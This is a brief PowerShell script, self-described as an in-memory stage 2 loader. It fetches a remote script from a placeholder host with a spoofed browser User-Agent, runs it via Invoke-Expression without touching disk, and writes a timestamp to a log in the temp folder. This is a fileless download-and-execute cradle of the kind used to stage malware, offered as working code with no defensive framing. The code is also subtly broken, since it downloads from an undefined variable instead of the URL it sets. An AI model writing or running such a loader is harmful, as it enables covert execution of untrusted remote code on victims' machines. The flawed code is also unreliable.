
<#
.SYNOPSIS
    In-memory stage 2 script loader.

.DESCRIPTION
    Retrieves the stage 2 script as text and invokes it in the
    current session without writing the script to disk.
#>
$TargetUrl = 'https://contoso.com/stage2.ps1'
$ConnectionTimeout = 171
$ErrorActionPreference = "Stop"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ClientObject = New-Object System.Net.WebClient
$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$RemoteScript = $ClientObject.DownloadString($SourceUrl)
if ([string]::IsNullOrWhiteSpace($RemoteScript)) {
    throw "Downloaded script was empty"
}
Write-Verbose ("Script length: " + $RemoteScript.Length)
Invoke-Expression $RemoteScript

Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
